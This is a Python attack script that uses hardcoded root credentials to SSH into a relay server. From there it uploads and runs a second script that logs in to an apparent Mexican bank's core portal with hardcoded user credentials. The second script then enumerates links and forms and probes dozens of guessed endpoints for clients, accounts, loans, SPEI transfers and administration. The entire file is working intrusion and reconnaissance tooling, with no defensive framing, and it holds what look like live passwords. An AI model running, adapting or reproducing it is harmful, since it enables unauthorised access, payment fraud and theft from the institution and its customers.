import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r"""
import requests, urllib3, json, sys, time, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.111 Safari/537.36"

BASE = "https://core.findep.mx"
USER = "jcruzval"
PASS = "Fisa1234*"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA, "Referer": BASE + "/core/index.jsp"})

# ========================================
# STEP 1: LOGIN
# ========================================
sys.stdout.write("=== LOGIN ===\n")
r_get = s.get(BASE + "/core/index.jsp", timeout=15)
act_m = re.search(r'action="([^"]+)"', r_get.text)
action = act_m.group(1) if act_m else "/core/valida.do"

r_login = s.post(BASE + action, timeout=15, allow_redirects=True, data={
    "cve_idToken": "",
    "msjPass": "",
    "cveUsr": "",
    "cve_usr": USER,
    "cve_psd": PASS,
    "ok_btn": "Aceptar",
})

is_login_page = "cve_usr" in r_login.text and "cve_psd" in r_login.text and "valida.do" in r_login.text
has_error = "no son reconocidos" in r_login.text or "bloqueado" in r_login.text.lower()

sys.stdout.write(f"Login: [{r_login.status_code}] {len(r_login.text)}b url={r_login.url}\n")
sys.stdout.write(f"Is login page: {is_login_page}  Has error: {has_error}\n")
sys.stdout.write(f"Cookies: {dict(s.cookies)}\n")

title = re.search(r'<title>(.*?)</title>', r_login.text, re.I | re.S)
if title: sys.stdout.write(f"Title: {title.group(1).strip()[:100]}\n")

if has_error or is_login_page:
    sys.stdout.write("LOGIN FAILED\n")
    sys.exit(1)

sys.stdout.write("*** LOGIN SUCCESS ***\n\n")

# Save dashboard
with open("/root/core_dashboard.html", "w") as f:
    f.write(r_login.text)
sys.stdout.write("Saved dashboard to /root/core_dashboard.html\n\n")

# ========================================
# STEP 2: ENUMERATE DASHBOARD
# ========================================
sys.stdout.write("=== DASHBOARD CONTENT ===\n\n")

# Extract ALL links
links = re.findall(r'href="([^"]+)"', r_login.text)
sys.stdout.write(f"Links found: {len(links)}\n")
for l in links:
    if not l.startswith("http") and not l.startswith("#") and not l.startswith("javascript"):
        sys.stdout.write(f"  {l}\n")
sys.stdout.write("\n")

# Extract ALL form actions
forms = re.findall(r'<form[^>]*action="([^"]+)"[^>]*>', r_login.text, re.I)
sys.stdout.write(f"Form actions: {forms}\n\n")

# Extract menu items (usually li or td with links)
menu_items = re.findall(r'<(?:li|td|div)[^>]*>.*?<a[^>]*href="([^"]+)"[^>]*>(.*?)</a>', r_login.text, re.S | re.I)
sys.stdout.write(f"Menu items: {len(menu_items)}\n")
for href, text in menu_items:
    clean = re.sub(r'<[^>]+>', '', text).strip()
    if clean:
        sys.stdout.write(f"  [{clean[:60]}] → {href[:100]}\n")
sys.stdout.write("\n")

# Extract JS variables / navigation
js_vars = re.findall(r'(?:var|let|const)\s+(\w+)\s*=\s*["\']([^"\']+)["\']', r_login.text)
for vname, vval in js_vars[:20]:
    sys.stdout.write(f"  JS var: {vname} = {vval[:100]}\n")

# Extract onclick actions
onclicks = re.findall(r'onclick="([^"]+)"', r_login.text)
sys.stdout.write(f"\nOnclick handlers ({len(onclicks)}):\n")
for oc in onclicks[:30]:
    sys.stdout.write(f"  {oc[:150]}\n")

# ========================================
# STEP 3: PROBE KEY ENDPOINTS
# ========================================
sys.stdout.write("\n=== ENDPOINT PROBE ===\n\n")

# Common Struts .do actions in banking systems
endpoints = [
    # Navigation / menu
    "/core/menu.do", "/core/menuPrincipal.do", "/core/inicio.do", "/core/main.do",
    "/core/bienvenido.do", "/core/home.do", "/core/principal.do",
    # Client/customer
    "/core/cliente.do", "/core/clientes.do", "/core/consultaCliente.do",
    "/core/buscarCliente.do", "/core/detalleCliente.do", "/core/altaCliente.do",
    # Accounts / balances
    "/core/cuenta.do", "/core/cuentas.do", "/core/saldo.do", "/core/consultaCuenta.do",
    "/core/estado.do", "/core/estadoCuenta.do",
    # Loans / credits
    "/core/credito.do", "/core/prestamo.do", "/core/solicitud.do",
    "/core/creditos.do", "/core/prestamos.do",
    # Payments / SPEI
    "/core/pago.do", "/core/pagos.do", "/core/transferencia.do",
    "/core/spei.do", "/core/dispersion.do", "/core/deposito.do",
    "/core/cobranza.do", "/core/cobro.do",
    # Reports
    "/core/reporte.do", "/core/reportes.do", "/core/consulta.do",
    "/core/bitacora.do",
    # Admin
    "/core/usuario.do", "/core/usuarios.do", "/core/perfil.do",
    "/core/configuracion.do", "/core/admin.do",
    # Catalog
    "/core/catalogo.do", "/core/catalogos.do",
    # Documents
    "/core/documento.do", "/core/documentos.do",
    # Buzon
    "/core/buzon.do", "/BuzonDigital/",
]

accessible = []
for ep in endpoints:
    try:
        r = s.get(BASE + ep, timeout=8, allow_redirects=False)
        ct = r.headers.get("Content-Type", "")[:30]
        loc = r.headers.get("Location", "")[:60]
        if r.status_code not in [404, 403]:
            sys.stdout.write(f"  [{r.status_code}] {ep} ({len(r.text)}b) {ct}")
            if loc: sys.stdout.write(f" → {loc}")
            sys.stdout.write("\n")
            if r.status_code == 200 and len(r.text) > 1000 and "login" not in r.url:
                accessible.append((ep, r.text[:2000]))
    except Exception as e:
        pass
    sys.stdout.flush()

sys.stdout.write(f"\nAccessible endpoints: {len(accessible)}\n")
for ep, content in accessible:
    sys.stdout.write(f"\n--- {ep} ---\n{content[:500]}\n")

# ========================================
# STEP 4: FULL TEXT SEARCH FOR SPEI/TRANSFER
# ========================================
sys.stdout.write("\n\n=== DASHBOARD KEYWORD SCAN ===\n\n")

for kw in ["spei", "SPEI", "transfer", "pago", "dispersion", "cobro", "credito", "cuenta",
           "cliente", "saldo", "monto", "clabe", "banco"]:
    matches = [(m.start(), r_login.text[max(0,m.start()-50):m.end()+100])
               for m in re.finditer(kw, r_login.text, re.I)]
    if matches:
        sys.stdout.write(f"\nKeyword '{kw}': {len(matches)} hits\n")
        for pos, ctx in matches[:3]:
            clean = re.sub(r'<[^>]+>', '', ctx).strip()
            if clean:
                sys.stdout.write(f"  ...{clean[:150]}...\n")

sys.stdout.write("\n=== DONE ===\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/core_jcruzval.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/core_jcruzval.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 120:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
